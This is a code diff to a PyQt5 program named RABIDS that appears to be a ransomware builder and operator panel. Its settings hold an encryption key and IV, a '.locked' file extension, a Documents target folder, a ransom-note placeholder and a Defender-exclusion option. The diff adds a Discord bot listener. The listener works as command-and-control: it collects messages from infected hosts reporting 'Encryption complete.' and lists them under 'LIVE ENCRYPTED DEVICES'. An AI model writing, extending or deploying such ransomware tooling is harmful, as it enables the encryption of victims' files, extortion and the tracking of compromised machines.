@@ -12,7 +12,9 @@ from PyQt5.QtWidgets import (
     QListWidgetItem, QSizePolicy
 )
 from PyQt5.QtGui import QFont, QPixmap, QMovie
-from PyQt5.QtCore import Qt, QThread, pyqtSignal
+from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
+import discord
+import asyncio
 
 ASCII = r"""                                                                                                                                                                                                                         
 """
@@ -58,7 +60,9 @@ MODULE_OPTIONS = {
         'iv': 'abcdef9876543210',
         'extension': '.locked',
         'targetDir': '$HOME/Documents',
-        'htmlContent': 'YOUR_HTML_RANSOM_NOTE_CONTENT_HERE'
+        'htmlContent': 'YOUR_HTML_RANSOM_NOTE_CONTENT_HERE',
+        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
+        'creatorId': 'YOUR_DISCORD_USER_ID'
     },
     'module/poof': {
         'targetDir': '$HOME/Documents'
@@ -68,6 +72,43 @@ MODULE_OPTIONS = {
         'defenderExclusion': 'true'
     }
 }
+
+class DiscordListener(QObject):
+    device_status_update = pyqtSignal(str, str)
+
+    def __init__(self, token):
+        super().__init__()
+        self.token = token
+        self.client = discord.Client(intents=discord.Intents.default())
+
+        @self.client.event
+        async def on_ready():
+            print(f'GUI Listener logged in as {self.client.user}')
+            self.device_status_update.emit("SYSTEM", f"Connected to Discord as {self.client.user}")
+
+        @self.client.event
+        async def on_message(message):
+            if message.author == self.client.user:
+                return
+            
+            if isinstance(message.channel, discord.DMChannel):
+                content = message.content
+                if ':' in content:
+                    parts = content.split(':', 1)
+                    hostname, status_msg = parts[0].strip(), parts[1].strip()
+
+                    if "Encryption complete." in status_msg:
+                        self.device_status_update.emit(hostname, "Encrypted")
+
+    async def run_client(self):
+        try:
+            await self.client.start(self.token)
+        except discord.LoginFailure:
+            self.device_status_update.emit("ERROR", "Discord login failed. Check the token.")
+
+    async def stop_client(self):
+        if self.client:
+            await self.client.close()
 
 class BuildThread(QThread):
     log_signal = pyqtSignal(str, str)
@@ -107,6 +148,27 @@ class BuildThread(QThread):
             self.log_signal.emit(f"An unexpected error occurred during build: {e}", "error")
             self.finished_signal.emit(-1)
 
+class DiscordListenerThread(QThread):
+    device_status_update = pyqtSignal(str, str)
+
+    def __init__(self, token):
+        super().__init__()
+        self.token = token
+        self.listener = None
+        self.loop = None
+
+    def run(self):
+        self.loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(self.loop)
+        listener = DiscordListener(self.token)
+        listener.device_status_update.connect(self.device_status_update)
+        self.listener = listener
+        self.loop.run_until_complete(listener.run_client())
+
+    def stop(self):
+        if self.loop and self.listener:
+            self.loop.call_soon_threadsafe(self.loop.create_task, self.listener.stop_client())
+            self.device_status_update.emit("SYSTEM", "Disconnected from Discord.")
 
 class ModuleTableWidget(QTableWidget):
     """A QTableWidget that supports drag-and-drop row reordering."""
@@ -149,6 +211,7 @@ class RABIDSGUI(QMainWindow):
         self.selected_modules = []
         self.loading_movie = None
         self.build_thread = None
+        self.discord_thread = None
         self.option_inputs = {}
         self.module_options_group = None
         self.loot_files_list = None
@@ -574,6 +637,7 @@ class RABIDSGUI(QMainWindow):
         self.uncrash_build_btn.clicked.connect(self.run_uncrash_compiler)
         uncrash_options_layout.addWidget(self.uncrash_build_btn)
 
+        uncrash_options_layout.addStretch()
         uncrash_layout.addWidget(uncrash_options_group)
 
         bottom_section_layout = QHBoxLayout()
@@ -581,15 +645,33 @@ class RABIDSGUI(QMainWindow):
         left_column_widget = QWidget()
         left_column_layout = QVBoxLayout(left_column_widget)
         
+        devices_header_layout = QHBoxLayout()
         encrypted_devices_label = QLabel("LIVE ENCRYPTED DEVICES")
         encrypted_devices_label.setFont(title_font)
+        devices_header_layout.addWidget(encrypted_devices_label)
+        devices_header_layout.addStretch()
+        left_column_layout.addLayout(devices_header_layout)
+
+        listener_layout = QHBoxLayout()
+        listener_label = QLabel("Listener Bot Token:")
+        listener_label.setFont(subtitle_font)
+        listener_label.setStyleSheet("color: #f7f294;")
+        self.listener_token_edit = QLineEdit()
+        self.listener_token_edit.setPlaceholderText("Enter your GUI's Discord bot token here")
+        self.listener_token_edit.setFont(subtitle_font)
+        self.toggle_listener_btn = QPushButton("Connect")
+        self.toggle_listener_btn.setFont(subtitle_font)
+        self.toggle_listener_btn.clicked.connect(self.toggle_discord_listener)
+        listener_layout.addWidget(listener_label)
+        listener_layout.addWidget(self.listener_token_edit, 1)
+        listener_layout.addWidget(self.toggle_listener_btn)
+        left_column_layout.addLayout(listener_layout)
+
         self.encrypted_devices_table = QTableWidget()
-        self.encrypted_devices_table.setColumnCount(2)
-        self.encrypted_devices_table.setHorizontalHeaderLabels(["Device", "Status"])
+        self.encrypted_devices_table.setColumnCount(1)
+        self.encrypted_devices_table.setHorizontalHeaderLabels(["Device"])
         self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
-        self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
-        
-        left_column_layout.addWidget(encrypted_devices_label)
+
         left_column_layout.addWidget(self.encrypted_devices_table)
         
         uncrash_image_label = QLabel()
@@ -1081,7 +1163,7 @@ class RABIDSGUI(QMainWindow):
             f"--option=key={key}",
             f"--option=iv={iv}",
             f"--option=extension={ext}",
-            "--option=decrypt=true"
+            "--option=decrypt"
         ]
         cmd.extend(options)
 
@@ -1090,6 +1172,56 @@ class RABIDSGUI(QMainWindow):
         self.build_thread.log_signal.connect(self.log_message)
         self.build_thread.finished_signal.connect(self.build_finished)
         self.build_thread.start()
+
+    def toggle_discord_listener(self):
+        if self.discord_thread and self.discord_thread.isRunning():
+            # Stop the listener
+            self.discord_thread.stop()
+            self.discord_thread.quit()
+            self.discord_thread.wait()
+            self.discord_thread = None
+            self.toggle_listener_btn.setText("Connect")
+            self.listener_token_edit.setEnabled(True)
+            self.log_message("Discord listener disconnected.", "system")
+        else:
+            # Start the listener
+            token = self.listener_token_edit.text()
+            if not token:
+                self.log_message("Error: Discord listener bot token is required.", "error")
+                self.tab_widget.setCurrentIndex(1)
+                return
+
+            if self.discord_thread and self.discord_thread.isRunning():
+                self.log_message("Listener is already running.", "system")
+                return
+
+            self.discord_thread = DiscordListenerThread(token)
+            self.discord_thread.device_status_update.connect(self.update_device_status)
+            self.discord_thread.start()
+            self.toggle_listener_btn.setText("Disconnect")
+            self.listener_token_edit.setEnabled(False)
+
+    def update_device_status(self, hostname, status):
+        if hostname == "SYSTEM" or hostname == "ERROR":
+            msg_type = "error" if hostname == "ERROR" else "system"
+            self.log_message(f"Listener: {status}", msg_type)
+            if "failed" in status:
+                self.toggle_listener_btn.setText("Connect")
+                self.toggle_listener_btn.setEnabled(True)
+                self.listener_token_edit.setEnabled(True)
+            return
+
+        for row in range(self.encrypted_devices_table.rowCount()):
+            item = self.encrypted_devices_table.item(row, 0)
+            if item and item.text() == hostname:
+                if status == "Decrypted": # Device is decrypted, remove it
+                    self.encrypted_devices_table.removeRow(row) 
+                return
+        
+        if status == "Encrypted": # New device is encrypted, add it
+            row_position = self.encrypted_devices_table.rowCount()
+            self.encrypted_devices_table.insertRow(row_position)
+            self.encrypted_devices_table.setItem(row_position, 0, QTableWidgetItem(hostname))
 
     def update_restore_destination_view(self):
         self.clear_garbage_loading_view()
